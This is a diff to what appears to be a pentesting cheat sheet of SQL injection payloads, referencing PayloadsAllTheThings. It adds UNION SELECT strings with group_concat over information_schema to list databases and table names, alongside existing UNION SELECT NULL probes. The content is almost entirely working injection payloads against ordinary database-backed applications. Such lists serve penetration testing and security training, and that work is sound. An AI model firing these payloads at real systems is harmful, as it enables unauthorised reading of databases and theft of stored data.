@@ -29,7 +29,12 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
 
 - ' UNION select 1,table_schema,table_name from information_schema.tables #<br />
 - ' UNION select 1,table_name,column_name from information_schema.columns #<br /><br />
--  union select 1,group_concat(schema_name),3,4,5 from information_schema.schemata
+
+Get other databases
+- union select 1,group_concat(schema_name),3,4,5 from information_schema.schemata <br />
+
+Retrieve table names
+- union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()<br />
 - OR
 - ' UNION SELECT NULL--
 - ' UNION SELECT NULL,NULL--
